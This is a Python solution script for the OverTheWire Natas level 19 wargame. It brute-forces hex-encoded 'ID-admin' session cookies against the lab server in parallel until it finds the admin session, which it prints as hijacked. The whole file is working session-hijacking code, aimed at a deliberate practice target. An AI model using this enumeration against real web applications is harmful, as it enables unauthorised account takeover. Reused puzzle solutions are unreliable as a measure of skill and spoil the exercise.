import requests
from requests.auth import HTTPBasicAuth
import string
from concurrent.futures import ThreadPoolExecutor

url = 'http://natas19.natas.labs.overthewire.org/'
# The credentials for auth in the level
username = 'natas19'
password = 'passwordPlaceholder'

current_password = ""
last_password = None

session_range = range(1,641)

def build_admin_session(session_ID):
    session= str(session_ID) + "-admin"
    return session.encode('utf-8').hex()


def send_request(session_ID):
    try:
        # This won't affect the result, but it's funny
        # -,"
        # [_P
        form_data = {'username': 'admin',
                     'password': 'letmeinpls'}

        cookies = {
            "PHPSESSID": build_admin_session(session_ID)
        }

        response = requests.post(url, cookies=cookies, data=form_data, auth=HTTPBasicAuth(username, password))

        if "You are an admin." in response.text:
            return True, session_ID, response.text
        else:
            return False, session_ID, None

    except requests.exceptions.RequestException as e:
        return False, None, None

def perform_parallel_requests():
    with ThreadPoolExecutor(max_workers= len(session_range)) as executor:
        # Submit request for each ID# in range
        futures = [executor.submit(send_request, i) for i in session_range]

        for future in futures:
            admin, session, response = future.result()
            print(f"Session id: {session} | admin: {admin}")
            if admin:
                print(f"Hijacked Admin session: {response}")
                break

perform_parallel_requests()